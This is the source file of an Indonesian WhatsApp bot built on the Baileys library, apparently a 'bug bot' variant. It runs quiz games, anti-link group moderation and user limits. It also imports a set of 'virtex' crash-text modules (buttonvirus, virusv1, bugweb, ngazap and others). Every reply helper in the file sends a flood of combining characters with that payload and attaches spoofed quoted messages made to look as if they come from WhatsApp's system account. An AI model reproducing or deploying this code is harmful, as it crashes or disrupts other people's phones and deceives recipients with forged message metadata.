/**
   * Create By Dika Ardnt.
   * Contact Me on wa.me/6288292024190
   * Follow https://github.com/DikaArdnt
*/

require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const { buttonvirus } = require('./virtex/buttonvirus')
const { buttonfour } = require('./virtex/buttonfour')
const { virusv1 } = require('./virtex/virusv1')
const { virusv3 } = require('./virtex/virusv3')
const { iphone } = require('./virtex/iphone')
const { philips } = require('./virtex/philips')
const { kanjut } = require('./virtex/kanjut')
const { doctext } = require('./virtex/doctext')
const { bugweb } = require('./virtex/bugweb')
const { ngazap } = require('./virtex/ngazap')
const { doc } = require('./virtex/doc')
const { four } = require('./virtex/four')
const { jobot } = require('./virtex/jobot')
const { jobot2 } = require('./virtex/jobot2')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')

// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []

module.exports = hisoka = async (hisoka, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await hisoka.decodeJid(hisoka.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const isMedia = /image|video|sticker|audio/.test(mime)
        const from = mek.key.remoteJid
	
        // Group
        const groupMetadata = m.isGroup ? await hisoka.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
//=================================================//
// Fake Next Projext
 const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":`© ${ownername}`, "h": `Hmm`,'seconds': '359996400', 'gifPlayback': 'true', 'caption': `© ${ownername}`, 'jpegThumbnail': thumb}}}
const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`${pushname}`, "h": `Hmm`,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
//=================================================//
  // Random Image Simple Menu
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]
//=================================================//
// Reply Kalau Mau Pake Tinggal Ubah aja m.reply Ke m.reply = replace aja semua 
/*const m.reply = (teks) => {
hisoka.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `${botname}`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": thumb,"sourceUrl": `${myweb}`}}}, { quoted: m })
}   */
//=================================================//
// Kontak
 const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
const bacito = (jid, text, quoted = fkontak) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/c/HwModsWa857` }}}, { quoted })
//=================================================//
//GCLINK
const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `© ${ownername}`, 'jpegThumbnail': thumb}}}
const bacit = (jid, text, quoted = fgclink) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/c/HwModsWa857` }}}, { quoted })
//=================================================//
//Document
const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
const bacot = (jid, text, quoted = fdoc) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/c/HwModsWa857` }}}, { quoted })
//=================================================//
// VN 
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
const hwbro = (jid, text, quoted = fvn) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/c/HwModsWa857` }}}, { quoted })
//=================================================//
//Lokasi
const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: `${ownername}`,jpegThumbnail: thumb}}}
const hwmods = (jid, text, quoted = floc) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/c/HwModsWa857` }}}, { quoted })
//=================================================//
//Troli
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "6289523258649-1604595598@g.us"}, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: thumb, surface: 200, message: `© ${ownername}`, orderTitle: 'memek', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const review = (jid, text, quoted = ftroli) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/c/HwModsWa857` }}}, { quoted })
//=================================================//
//image
const ctlg = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net"},"message": { "orderMessage": { "itemCount": 0, "surface": 'CATALOG' }}}
const reply = (jid, text, quoted = ctlg) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/c/HwModsWa857` }}}, { quoted })

//=================================================//
	
	
	try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
    
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false	
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
	    
        // Public & Self
        if (!hisoka.public) {
            if (!m.key.fromMe) return
        }

        // Push Message To Console && Auto Read
        if (m.message) {
            hisoka.sendReadReceipt(m.chat, m.sender, [m.key.id])
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
	
	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await hisoka.setStatus(`${hisoka.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
	    
	  // Anti Link
        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await hisoka.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
        if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
        hisoka.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
        
      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: hisoka.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, hisoka.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        hisoka.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            hisoka.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
        
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
